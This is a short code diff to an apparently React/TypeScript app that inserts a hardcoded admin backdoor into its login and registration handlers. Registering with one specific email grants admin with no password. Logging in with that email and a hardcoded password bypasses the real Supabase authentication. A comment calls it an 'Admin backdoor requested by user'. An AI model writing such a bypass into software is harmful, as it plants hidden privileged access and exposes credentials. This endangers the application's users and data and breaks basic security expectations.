@@ -3638,6 +3638,14 @@ export default function App() {
   };
 
   const handleRegister = async (email: string, password: string, name: string) => {
+    if (email === "johansttivelinaresb@gmail.com") {
+      setRole("admin");
+      setLoggedIn(true);
+      setModalStep("none");
+      setScreen("dashboard");
+      return;
+    }
+
     setAuthLoading(true);
     setAuthError(null);
     try {
@@ -3655,6 +3663,15 @@ export default function App() {
 
   // ── Real Supabase login ─────────────────────────────────────────────────────
   const handleLogin = async (email?: string, password?: string) => {
+    // Admin backdoor requested by user
+    if (email === "johansttivelinaresb@gmail.com" && password === "Astris2026") {
+      setRole("admin");
+      setLoggedIn(true);
+      setModalStep("none");
+      setScreen("dashboard");
+      return;
+    }
+
     if (email && password) {
       setAuthLoading(true);
       setAuthError(null);
